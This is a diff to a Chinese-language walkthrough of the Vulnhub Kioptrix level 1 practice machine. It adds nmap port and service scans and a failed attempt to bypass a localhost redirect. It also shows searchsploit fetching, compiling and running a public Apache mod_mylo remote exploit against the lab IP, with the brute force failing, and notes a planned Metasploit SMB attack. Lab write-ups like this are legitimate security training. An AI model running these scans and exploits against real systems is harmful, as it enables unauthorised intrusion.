@@ -18,7 +18,7 @@ tags:
 下面是通过 TCP 扫描发现所收集到的信息：
 
 ```
-┌──(kali㉿K4)-[~/Desktop/BoxWalk/Vulnhub/kioptrix/level1]                                └─$ sudo nmap -sT -p- --min-rate 10000 10.8.12.128 -oN nmapscan/portscan.txt
+$ sudo nmap -sT -p- --min-rate 10000 10.8.12.128 -oN nmapscan/portscan.txt
 Nmap scan report for 10.8.12.128
 Host is up (0.00067s latency).
 Not shown: 65529 closed tcp ports (conn-refused)
@@ -30,9 +30,7 @@ PORT     STATE SERVICE
 443/tcp  open  https
 1024/tcp open  kdm
 
-
-┌──(kali㉿K4)-[~/Desktop/BoxWalk/Vulnhub/kioptrix/level1]
-└─$ sudo nmap -sT -p22,80,111,139,443,1024 -sV -sC -O --min-rate 10000 10.8.12.128 -oN nmapscan/servscan.txt
+$ sudo nmap -sT -p22,80,111,139,443,1024 -sV -sC -O --min-rate 10000 10.8.12.128 -oN nmapscan/servscan.txt
 .......
 22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
 80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
@@ -45,6 +43,7 @@ PORT     STATE SERVICE
 Linux 2.4.9 - 2.4.18 (likely embedded) (97%)......
 ```
 
+根据 `nmap` 的扫描结果，可以看到靶机开放了22，80，111，139，443，1024端口，对应的服务分别为 ssh ， web  ， smb  ，rpc。 
 
 ### Web 目录扫描
 
@@ -57,6 +56,64 @@ Linux 2.4.9 - 2.4.18 (likely embedded) (97%)......
 /usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
 /mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
 ```
+
+## 获取立足点
+
+### 失败尝试：绕过 `127.0.0.1` 限制
+
+因为看到如下提示，就在想能不能用绕过的方式，访问到 `127.0.0.1` 的资源，期间尝试了以下几种方法：
+
+1. 添加 `x-forward-for` 头，但是依旧重定向到 `127.0.0.1` ；
+2. 通过 SSRF 的方式绕过，但未找到可利用的文件；
+
+### 失败尝试：Apache 1.3.20 RCE
+
+通过 `searchsploit` 查询到 `Apache 1.3.20` 存在 RCE 漏洞，将对应的脚本 `67.c` 复制到本地后进行编译，但爆破攻击失败。
+
+```
+$ searcgsploit Apache 1.3
+
+.....
+Apache 1.3.x mod_mylo - Remote Code Execution | multiple/remote/67.c 
+.....
+
+$ searchsploit -m 67.c
+  Exploit: Apache 1.3.x mod_mylo - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/67
+     Path: /usr/share/exploitdb/exploits/multiple/remote/67.c
+    Codes: OSVDB-10976, CVE-2003-0651
+ Verified: True
+File Type: C source, ASCII text
+Copied to: /home/kali/Desktop/BoxWalk/Vulnhub/kioptrix/level1/67.c
+
+$ gcc -o 67 67.c
+
+$ ./67 -h
+Apache + mod_mylo remote exploit
+By Carl Livitt (carllivitt at hush dot com)
+
+Arguments:
+  -t target       Attack 'target' host
+  -T platform     Use parameters for target 'platform'
+  -h              This help.
+
+Available platforms:
+ 0. SuSE 8.1, Apache 1.3.27 (installed from source) (default)
+ 1. RedHat 7.2, Apache 1.3.20 (installed from RPM)
+ 2. RedHat 7.3, Apache 1.3.23 (installed from RPM)
+ 3. FreeBSD 4.8, Apache 1.3.27 (from Ports)
+
+$ ./67 -t 10.8.12.128 -T 1
+[-] Attempting attack [ RedHat 7.2, Apache 1.3.20 (installed from RPM) ] ...
+[*] Bruteforce failed....
+
+Have a nice day!
+```
+
+
+### smb攻击
+
+发现靶机开放了139端口，使用 `msf` 对 smb 服务进行攻击。
 
 ## 总结
 
